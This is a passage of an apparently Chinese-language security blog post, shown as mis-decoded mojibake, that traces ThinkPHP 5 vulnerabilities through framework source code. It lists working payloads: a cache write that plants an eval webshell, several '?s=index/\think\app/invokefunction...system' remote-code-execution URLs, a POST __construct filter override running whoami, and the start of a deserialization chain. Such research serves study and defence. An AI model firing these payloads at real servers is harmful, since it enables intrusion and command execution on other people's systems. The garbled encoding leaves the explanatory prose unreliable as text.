$config);}</code></pre><p>æ³¨æ„åˆ°å¦‚æœ<code>$template</code>å¯¹åº”çš„è·¯å¾„æ–‡ä»¶ä¸å­˜åœ¨çš„è¯ç›´æ¥æŠ¥é”™äº†ã€‚æ‰€ä»¥è¿™ä¸ªlfiæ´çš„å‰æè¿˜å¾—éœ€è¦æˆ‘ä»¬ç¯å¢ƒä»£ç ä¸­å­˜åœ¨<code>å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</code>ã€‚<br>å¦‚æœè¿™é‡Œæ²¡æŠ¥é”™å³è¿›å…¥templateçš„<code>fetch</code>.<br><img src="/2020/08/05/Thinkphp-vuln/12.PNG" class="lazyload" data-srcset="12.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>çœ‹åˆ°<code>$vars</code>è¢«èµ‹ç»™data.è€Œé©¬ä¸Šä¸‹é¢storageè°ƒç”¨äº†readå‡½æ•°ã€‚é‡Œé¢å­˜åœ¨<code>extract</code>è¿™æ ·çš„å˜é‡è¦†ç›–ä»£ç ã€‚å¹¶ä¸”ç›´æ¥<code>include</code>cacheFileã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´,<code>$cacheFile</code>å¯ä»¥è¢«å˜é‡è¦†ç›–ã€‚è¾¾æˆlfiã€‚</p><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯é€šè¿‡å°†<code>$cacheFile</code> å˜é‡å­˜å‚¨åœ¨ <code>$this-&gt;cacheFile</code> ä¸­.é˜²æ­¢å˜é‡è¦†ç›–ã€‚</p><h2 id="tp5-0-rce"><a href="#tp5-0-rce" class="headerlink" title="tp5.0-rce"></a>tp5.0-rce</h2><p>Index.phpé…ç½®</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Cache;class Index{    public function index()    {        Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));        return &#39;Cache success&#39;;    }}</code></pre><p>payload</p><pre><code>http://localhost/tpdemo/public/?username=byc_404%0d%0a@eval($_GET[_]);// </code></pre><p>ä¸Šé¢çš„payloadå°†æŠŠä¸€å¥è¯webshellå†™å…¥ç¼“å­˜æ–‡ä»¶ã€‚è®¿é—®å¯¹åº”è·¯å¾„å³å¯ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/13.PNG" class="lazyload" data-srcset="13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¸ªç”¨ä¾‹å…¶å®è·Ÿä»¥å‰ichunqiuå¹³å°ä¸Šä¸€é“thinkphpäºŒæ¬¡å¼€å‘çš„æ¨¡æ¿ç¼“å­˜æ–‡ä»¶getshellå¾ˆç›¸ä¼¼ã€‚è¿™é‡Œæ¥è·Ÿè¿›ä¸‹æºç </p><pre><code class="php">public static function set($name, $value, $expire = null){    self::$writeTimes++;    return self::init()-&gt;set($name, $value, $expire);}......public static function init(array $options = []){    if (is_null(self::$handler)) {        // è‡ªåŠ¨åˆå§‹åŒ–ç¼“å­˜        if (!empty($options)) {            $connect = self::connect($options);        } elseif (&#39;complex&#39; == Config::get(&#39;cache.type&#39;)) {            $connect = self::connect(Config::get(&#39;cache.default&#39;));        } else {            $connect = self::connect(Config::get(&#39;cache&#39;));        }        self::$handler = $connect;    }    return self::$handler;}</code></pre><p>è¿™é‡Œinit()å‡½æ•°ä¸»è¦æ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ª<code>handler</code>å¯¹è±¡ã€‚æ­¤å¤„ä¸ºé»˜è®¤å€¼Fileç±»ã€‚é‚£ä¹ˆå‰å¾€cache/driver/Fileç±»çœ‹ä¸‹.<br>æ­¤å¤„Fileç±»çš„setæ–¹æ³•å¦‚ä¸‹</p><pre><code class="php">public function set($name, $value, $expire = null){    if (is_null($expire)) {        $expire = $this-&gt;options[&#39;expire&#39;];    }    $filename = $this-&gt;getCacheKey($name);    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {        $first = true;    }    $data = serialize($value);    if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {        //æ•°æ®å‹ç¼©        $data = gzcompress($data, 3);    }    $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . $data . &quot;\n?&gt;&quot;;    $result = file_put_contents($filename, $data);    if ($result) {        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);        clearstatcache();        return true;    } else {        return false;    }}</code></pre><p>å¯ä»¥çœ‹åˆ°ã€‚æ•°æ®<code>$value</code>ç»ç”±åºåˆ—åŒ–åè¢«æ‹¼æ¥åˆ°å«æœ‰phpä»£ç å—çš„è¯­å¥ä¸­ã€‚ä¹‹åæ‰§è¡Œ<code>file_put_contents</code>.ç¬¦åˆæˆ‘ä»¬å†™å…¥shellçš„ç”¨æ³•ã€‚<br>å› æ­¤åªéœ€æ³¨æ„ä½¿ç”¨æ¢è¡Œç¬¦bypasså‰é¢çš„æ³¨é‡Šç¬¦å³å¯ã€‚</p><p>å½“ç„¶è¿™ä¸ªå†™shell rceçš„æ–¹æ³•æ¯”è¾ƒå°´å°¬ã€‚å› ä¸ºæ–‡ä»¶åå¯ä»¥çœ‹åˆ°ç”±<code>getCacheKey</code>å†³å®šã€‚å…¶æ–‡ä»¶åç”Ÿæˆæ–¹å¼å¦‚ä¸‹ï¼šå…ˆè®¡ç®—é”®åmd5å€¼ã€‚å†å–å‰ä¸¤ä½ä¸ºç›®å½•ã€‚å30ä½ä¸ºæ–‡ä»¶åã€‚æˆ‘ä»¬è¿™é‡Œæ˜¯å› ä¸ºæå‰è®¾å®šå¥½äº†Index.phpä¸­é”®åä¸º<code>name</code>.æ‰€ä»¥å¯ä»¥è®¡ç®—æ–‡ä»¶å<code>b0/68931cc450442b63f5b3d276ea4297.php</code>ã€‚ä½†æ˜¯å®é™…ä¸­å¦‚æœæ²¡æœ‰æºç æ³„éœ²æ— æ³•å¾—çŸ¥é”®åã€‚ä¹Ÿå°±æ²¡æ³•è®¡ç®—shellçš„è·¯å¾„ã€‚</p><p>å½“ç„¶ã€‚åœ¨ååºåˆ—åŒ–popé“¾ä¸­æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªFileç±»å…³äºæ–‡ä»¶åå¯æ§çš„é—®é¢˜å°±å¤§ä¸ä¸€æ ·äº†ã€‚å…·ä½“åé¢å†è¯´ã€‚</p><h2 id="tp5-rce-get"><a href="#tp5-rce-get" class="headerlink" title="tp5.*-rce-get"></a>tp5.*-rce-get</h2><p>æ¯”è¾ƒå‡ºåçš„rceæ´ã€‚å½±å“ç‰ˆæœ¬5.0.7&lt;=ThinkPHP5&lt;=5.0.22 ã€5.1.0&lt;=ThinkPHP&lt;=5.1.30ã€‚<br>5.1.xç‰ˆæœ¬çš„payloadæœ‰</p><pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><p>5.0.*</p><pre><code>?s=index/think\config/get&amp;name=database.username # è·å–é…ç½®ä¿¡æ¯?s=index/\think\Lang/load&amp;file=../../test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶?s=index/\think\Config/load&amp;file=../../t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><p>é¦–å…ˆèµ·å› å¯ä»¥ä»config/app.phpä¸­çœ‹åˆ°ã€‚é»˜è®¤æƒ…å†µä¸‹<code>var_pathinfo</code>ä¸ºs.<code>url_route_must</code>ä¸ºfalse<br><img src="/2020/08/05/Thinkphp-vuln/14.PNG" class="lazyload" data-srcset="14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ˜¾ç„¶æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä»»æ„è°ƒç”¨æ§åˆ¶å™¨ã€‚thinkphpä¸­çš„æµç¨‹æ˜¯<code>http://site/?s=æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•</code></p><p>åœ¨é‡è¦ä»£ç controllerå¤„ä¸‹æ–­ç‚¹ï¼ˆæ­¤å¤„ä¹Ÿæ˜¯5.1.30åé«˜ç‰ˆæœ¬å®˜æ–¹ä¿®æ”¹çš„éƒ¨åˆ†ã€‚è¯´æ˜åŸä»£ç å­˜åœ¨é—®é¢˜ï¼‰<br><img src="/2020/08/05/Thinkphp-vuln/15.PNG" class="lazyload" data-srcset="15.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>payload</p><pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</code></pre><p>è‡ªåŠ¨è·Ÿéšdebugè°ƒç”¨å‡½æ•°è·Ÿè¿›ã€‚å¼€å§‹åœ¨controllerè¿™å¯ä»¥çœ‹è§<code>$result</code>å˜é‡æ˜¯å­˜å‚¨äº†æˆ‘ä»¬ä¼ å…¥çš„å€¼çš„æ•°ç»„ã€‚å…¶å€¼åˆ†åˆ«ä¸º<code>index</code>,<code>\think\Request</code>,<code>input</code>.<br>ä¸€è·¯è·Ÿä¸‹å»ä¼šå‘ç°æ‰§è¡Œä»£ç çš„å…³é”®ä½ç½®åœ¨<br>thinkphp\library\think\route\dispatch\Module.php</p><pre><code class="php">public function exec(){    // ç›‘å¬module_init    $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);    try {        // å®ä¾‹åŒ–æ§åˆ¶å™¨        $instance = $this-&gt;app-&gt;controller($this-&gt;controller,            $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),            $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),            $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));    } catch (ClassNotFoundException $e) {        throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());    }    $this-&gt;app[&#39;middleware&#39;]-&gt;controller(function (Request $request, $next) use ($instance) {        // è·å–å½“å‰æ“ä½œå        $action = $this-&gt;actionName . $this-&gt;rule-&gt;getConfig(&#39;action_suffix&#39;);        if (is_callable([$instance, $action])) {            // æ‰§è¡Œæ“ä½œæ–¹æ³•            $call = [$instance, $action];            // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å            $reflect    = new ReflectionMethod($instance, $action);            $methodName = $reflect-&gt;getName();            $suffix     = $this-&gt;rule-&gt;getConfig(&#39;action_suffix&#39;);            $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;            $this-&gt;request-&gt;setAction($actionName);            // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡            $vars = $this-&gt;rule-&gt;getConfig(&#39;url_param_type&#39;)            ? $this-&gt;request-&gt;route()            : $this-&gt;request-&gt;param();        } elseif (is_callable([$instance, &#39;_empty&#39;])) {            // ç©ºæ“ä½œ            $call    = [$instance, &#39;_empty&#39;];            $vars    = [$this-&gt;actionName];            $reflect = new ReflectionMethod($instance, &#39;_empty&#39;);        } else {            // æ“ä½œä¸å­˜åœ¨            throw new HttpException(404, &#39;method not exists:&#39; . get_class($instance) . &#39;-&gt;&#39; . $action . &#39;()&#39;);        }        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;action_begin&#39;, $call);        $data = $this-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);        return $this-&gt;autoResponse($data);    });    return $this-&gt;app[&#39;middleware&#39;]-&gt;dispatch($this-&gt;request, &#39;controller&#39;);}</code></pre><p>ä»”ç»†ä¸€çœ‹å…¶å®å°±æ˜¯è°ƒç”¨äº†åå°„æ–¹æ³•ã€‚ç”¨<code>$this-&gt;controller</code>,<code>$this-&gt;actionName</code>.å› ä¸ºä¹‹å‰æˆ‘ä»¬çŸ¥é“Request ç±»çš„inputå‡½æ•°ä¼šå¯¹è¾“å…¥æ‰§è¡Œcall_user_funcæ“ä½œã€‚å› æ­¤æœ€åæ‰§è¡Œäº†<code>call_user_func(&#39;system&#39;,&#39;whoami&#39;)</code><br>å› æ­¤å®˜æ–¹æœ€åçš„ä¿®å¤æ˜¯é’ˆå¯¹è¾“å…¥æ§åˆ¶å™¨åè¿›è¡Œè¿‡æ»¤<code>^[A-Za-z](\w)*$</code></p><h2 id="tp-5-rce-post"><a href="#tp-5-rce-post" class="headerlink" title="tp-5.*-rce-post"></a>tp-5.*-rce-post</h2><p>é¦–å…ˆè¿™ä¸ªrceç‰ˆæœ¬5.0.*åº”è¯¥æ˜¯å°äº5.0.24çš„ã€‚æ‰€ä»¥ç”¨ä¸€ä¸ª5.0.23ç‰ˆæœ¬çš„å®éªŒä¸‹ã€‚</p><p>é¦–å…ˆpayload</p><pre><code>POST /?s=index/index HTTP/1.1_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/16.PNG" class="lazyload" data-srcset="16.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™é‡Œå› ä¸ºæˆ‘çš„Index.phpæ˜¯ä¹‹å‰å®éªŒifiæ—¶çš„ã€‚æ‰€ä»¥index/indexè·¯ç”±è¿”å›Cache Success.å®é™…ä¸Š<code>s</code>åªéœ€è¦èµ‹ç»™ä¸€ä¸ªå­˜åœ¨methodçš„æ§åˆ¶å™¨å³å¯ã€‚</p><p>ä¸‹é¢æ¥è·Ÿä¸‹æºç ã€‚é¦–å…ˆä»å®˜æ–¹commitä¿®æ”¹å¤„å¯ä»¥çœ‹å‡ºåŸå…ˆä»£ç ä¸­<code>this-&gt;$method</code>å˜é‡æ¥è‡ªå¯æ§æ•°æ®<code>$_POST</code></p><pre><code class="php">if (isset($_POST[Config::get(&#39;var_method&#39;)])) {            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);            $this-&gt;{$this-&gt;method}($_POST);</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨Requestç±»çš„methodäº†ã€‚çœ‹åˆ°payloadä¸­å­˜åœ¨__constructã€‚è‡ªç„¶çœ‹å‘æ„é€ æ–¹æ³•</p><pre><code class="php">protected function __construct($options = []){    foreach ($options as $name =&gt; $item) {        if (property_exists($this, $name)) {            $this-&gt;$name = $item;        }    }    if (is_null($this-&gt;filter)) {        $this-&gt;filter = Config::get(&#39;default_filter&#39;);    }    // ä¿å­˜ php://input    $this-&gt;input = file_get_contents(&#39;php://input&#39;);}</code></pre><p>è¿™ä¸ªforeachæ˜æ˜¾å­˜åœ¨é…ç½®è¦†ç›–çš„å†™æ³•ã€‚è¿™é‡Œç»§ç»­ä¸‹æ–­ç‚¹ä¸€è·¯è·Ÿå‘ç°ä¼šæ ¹æ®app_debugçš„å€¼å‰å¾€å½“å‰ç±»ä¸‹paramæ–¹æ³•ã€‚<br>è€Œè¿™ä¸ªæ–¹æ³•å…¨éƒ½èµ°inputæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯éƒ½ä¼šè°ƒç”¨äº†<code>call_user_func</code>ã€‚<br>å…·ä½“å¯ä»¥çœ‹è¿™å¼ å›¾<br><img src="/2020/08/05/Thinkphp-vuln/17.PNG" class="lazyload" data-srcset="17.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‰é¢æåˆ°æˆ‘ä»¬å¯ä»¥è¦†ç›–å±æ€§ã€‚è¿™é‡Œä¸»è¦å°±æ˜¯è¦†ç›–<code>filter</code>è·Ÿ<code>server</code>ã€‚å› ä¸ºmethodæ–¹æ³•ä¸­æ˜¯å–çš„æˆ‘ä»¬ä¼ å…¥çš„<code>this-&gt;server[&#39;REQUEST_METHOD&#39;]</code>çš„å€¼ã€‚æ‰€ä»¥è¦†ç›–ä¸º<code>whoami</code>åä½œä¸ºå‚æ•°è¢«é€åˆ°input.inputåˆå› ä¸ºfiltervalueæ–¹æ³•è°ƒç”¨call_user_funcã€‚ç›´æ¥åˆ©ç”¨è¦†ç›–çš„<code>system</code>ä½œä¸ºfliterå€¼å³å¯ã€‚<br>æœ€ååˆ°è¾¾call_user_func rce<br><img src="/2020/08/05/Thinkphp-vuln/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="tp5-0-x-unserialize"><a href="#tp5-0-x-unserialize" class="headerlink" title="tp5.0.x-unserialize"></a>tp5.0.x-unserialize</h2><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è·Ÿä¸‹tp5.0ç‰ˆæœ¬çš„ååºåˆ—åŒ–popé“¾ã€‚ä¸è¿‡è¿™é‡Œä¸ä¼šåˆ†äº«exp.(ç½‘ä¸Šè·Ÿå…ˆçŸ¥åº”è¯¥éƒ½èƒ½å¾ˆæ–¹ä¾¿æ‰¾åˆ°)ã€‚å¦‚æœéœ€è¦çš„è¯è‡ªå·±SCTF2020wpé‡Œæœ‰ç»•è¿‡çŸ­æ ‡ç­¾çš„expã€‚ä»¥åŠä»¥å‰è·Ÿphpæ¡†æ¶æœ‰å‡ ä¸ªå…¶ä»–çš„expå¯ä»¥è‡ªè¡Œå¯»æ‰¾ã€‚å½“ç„¶æˆ‘è®°å¾—wh1t3P1gå¤§ä½¬è‡ªå·±æŠŠtpçš„popchainé›†æˆåˆ°phpggcä¸­äº†ã€‚ä¹Ÿå¯ä»¥è‡ªåŠ¨ç”Ÿæˆã€‚</p><p>ç„¶åå°±æ˜¯windowsä¸‹å†™æ–‡ä»¶çš„æ–¹æ³•ã€‚ç›®å‰èƒ½å¤Ÿåœ¨php7ä»¥å‰çš„ç‰ˆæœ¬å†™shell expæ˜¯æœ‰çš„ã€‚ä½†php7çš„windowså†™shellæˆ‘è¿˜æ²¡æˆåŠŸè¿‡ã€‚ç†è®ºä¸Šwindowsä¸èƒ½æˆåŠŸçš„åŸå› åªæ˜¯å› ä¸ºæ–‡ä»¶åä¸å…è®¸<code>&lt;</code>,<code>?</code>çš„ã€‚ä½†æ˜¯å¦‚æœç”¨è¿‡æ»¤å™¨ç»•è¿‡çš„è¯åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„â€¦â€¦<br>php5.4.45+windows æˆåŠŸå†™å…¥phpinfo() (å…³é—­çŸ­æ ‡ç­¾)<br><img src="/2020/08/05/Thinkphp-vuln/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œæˆ‘å°±ç›´æ¥è·Ÿä¸‹linuxçš„payloadå§ã€‚<br>é¦–å…ˆæ˜¯å…¥å£ç‚¹ã€‚è‚¯å®šæ˜¯æ‰¾<code>__destruct</code>å‡½æ•°ã€‚ä¸éš¾å‘ç°ä¸€å…±åªæœ‰å‡ ä¸ªå¯ç”¨ã€‚æˆ‘ä»¬æ‰¾åˆ° library\think\process\pipesä¸‹windows.phpã€‚å‘ç°å…¶è°ƒç”¨äº†<code>$this-&gt;removeFiles</code>.è€Œ<code>removeFiles</code>åˆè°ƒç”¨äº†<code>file_exists</code>å¯ä»¥è§¦å‘<code>__toString</code>æ–¹æ³•ã€‚</p><pre><code class="php">private function removeFiles(){    foreach ($this-&gt;files as $filename) {        if (file_exists($filename)) {            @unlink($filename);        }    }    $this-&gt;files = [];}</code></pre><p>ps.å…³äºfile_existså¯ä»¥è§¦å‘<code>__toString</code>è‡ªå·±ä»¥å‰è¿˜æ²¡æœ‰æ³¨æ„è¿‡ã€‚å…·ä½“ä¸å¦¨å»l3m0nå¸ˆå‚…<a href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ä¸‹è¯„è®ºçœ‹çœ‹ã€‚<br>(åº”è¯¥æ˜¯å› ä¸ºfile_existsæ¥å—å­—ç¬¦ä¸²å‚æ•°,è€Œåªè¦å¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å³ä¼šè§¦å‘<code>__toString</code>)<br>å…¨å±€ç»§ç»­æ‰¾<code>toString</code>.ä¹Ÿåªæœ‰å‡ ä¸ªé€‰æ‹©ã€‚è¿™é‡Œæ‰¾åˆ° think\Model.php<br>.å®ƒè°ƒç”¨äº†<code>toJson</code>ã€‚è€Œ<code>toJson</code>ç»§ç»­è°ƒç”¨äº†<code>toArray</code>.</p><pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE){    return json_encode($this-&gt;toArray(), $options);}</code></pre><p>åŒæ—¶æ³¨æ„è¿™é‡ŒModelç±»æ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥å®é™…ç¼–å†™expæ—¶æˆ‘ä»¬å¿…é¡»ç”¨å®ƒçš„å­ç±»ã€‚æ¯”å¦‚æ­¤å¤„çš„Pivotã€‚<br>æˆ‘ä»¬ç›´æ¥æ¥åˆ°toArrayã€‚è¿™é‡Œé¦–å…ˆä¸»è¦çœ‹æœ‰æ²¡æœ‰å¯ä»¥è§¦å‘<code>__call</code>çš„æƒ…å†µã€‚5.0.24ç‰ˆæœ¬ä¸‹åº”è¯¥åˆä¸‰å¤„éƒ½æ˜¯å¯ä»¥æ»¡è¶³çš„</p><pre><code class="php">$relation = $this-&gt;getAttr($key);$value = $this-&gt;getRelationData($modelRelation);$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code></pre><p>ä¸å…¶è¯´æ˜¯æ‰¾è§¦å‘<code>__call</code>çš„ã€‚ä¸å¦‚è¯´æ˜¯æ‰¾å¯ç”¨æ–¹æ³•ã€‚å¤šæ•°æƒ…å†µä¸‹è¿™äº›æ–¹æ³•åŸºæœ¬åˆ©ç”¨ä¸äº†ã€‚ä½†æ˜¯å¦‚æœæ»¡è¶³<code>this-&gt;xxx($var)</code>æˆ–è€…è¿›ä¸€æ­¥<code>å¯æ§ç±»-&gt;xxx(å¯æ§å˜é‡)</code>ã€‚æˆ‘ä»¬å°±èƒ½æ‰¾ä»»æ„ç±»çš„<code>__call</code>è¿›è¡Œè¿›ä¸€æ­¥æŒ–æ˜ã€‚è¿™ä¹Ÿæ˜¯popé“¾ä¸­callæ–¹æ³•ç»å¸¸ç”¨åˆ°çš„åŸå› ä¹‹ä¸€ã€‚</p><p>ä¸ºäº†äº†è§£æˆ‘ä»¬å¦‚ä½•æ§åˆ¶è¿™ä¸€æ­¥ç”¨æ¥è°ƒç”¨<code>__call</code>ã€‚æˆ‘ä»¬å…ˆæ”¾ä¸€ä¸‹å…¨å±€æ‰¾<code>__call</code>çš„è¿‡ç¨‹ã€‚æ¥é€‰æ‹©ä¸€ä¸ªè§¦å‘æ–¹å¼ã€‚<br>å¯¹äº<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code><br>è¿™é‡Œçœ‹çœ‹<code>$value</code>ä¸<code>$attr</code>ä¾æ¬¡æ˜¯æ€ä¹ˆè¢«èµ‹å€¼çš„ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/20.PNG" class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>value</p><pre><code class="php">$relation = Loader::parseName($name, 1, false);$modelRelation = $this-&gt;$relation();$value         = $this-&gt;getRelationData($modelRelation);</code></pre><p>ä¸»è¦æ˜¯å¯¹<code>$name</code>è°ƒç”¨parseNameã€‚è€Œ<code>$name</code>æ¥è‡ªå¯æ§æ•°ç»„<code>$this-&gt;append</code>ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/21.PNG" class="lazyload" data-srcset="21.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¹Ÿå°±æ˜¯è¯´ã€‚<code>$modelrelation</code>æ˜¯Modelè¿™ä¸ªç±»ä»»æ„æ–¹æ³•çš„è¿”å›å€¼ã€‚(.<code>$relation()</code>)ã€‚æ‰€ä»¥æ‰¾ä¸€ä¸ªç›´æ¥è¿”å›å¯æ§æ•°æ®çš„æ–¹æ³•å³å¯ã€‚æ¯”å¦‚getError</p><pre><code class="php">public function getError(){    return $this-&gt;error;}</code></pre><p>å›åˆ°ä¸Šé¢ã€‚ç°åœ¨æˆ‘ä»¬ç»§ç»­è·Ÿè¿›getRelationData</p><pre><code class="php">protected function getRelationData(Relation $modelRelation){    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {        $value = $this-&gt;parent;    } else {        // é¦–å…ˆè·å–å…³è”æ•°æ®        if (method_exists($modelRelation, &#39;getRelation&#39;)) {            $value = $modelRelation-&gt;getRelation();        } else {            throw new BadMethodCallException(&#39;method not exists:&#39; . get_class($modelRelation) . &#39;-&gt; getRelation&#39;);        }    }    return $value;}</code></pre><p>é¦–å…ˆå®ƒæ¥æ”¶çš„å‚æ•°æ˜¯<code>Relation</code>ç±»çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸Šé¢è¿”å›çš„ç»“æœ<code>$this-&gt;error</code>è‚¯å®šä¹Ÿæ˜¯ä¸€ä¸ª<code>Relation</code>çš„å¯¹è±¡äº†ã€‚ï¼ˆRelationä¹Ÿæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥å®ä¾‹åŒ–æ—¶è¦ç”¨å®ƒçš„å­ç±»ï¼‰<br>ç„¶åæ­¤å¤„æˆ‘ä»¬è‡ªç„¶è¦èµ°ç¬¬ä¸€ä¸ªifåˆ†æ”¯æ¥æ§åˆ¶è¿”å›å€¼ã€‚åˆ†åˆ«çœ‹ä¸‹<code>isSelfRelation()</code>è·Ÿ<code>getModel()</code>å‘ç°éƒ½åªæ˜¯ç®€å•è¿”å›<code>this-&gt;relation</code>ä¸<code>this-&gt;query-&gt;model()</code>ã€‚å…¨éƒ¨å¯æ§ã€‚<br>é‚£åªå‰©ä¸‹è®©<code>get_class($modelRelation-&gt;getModel()) == 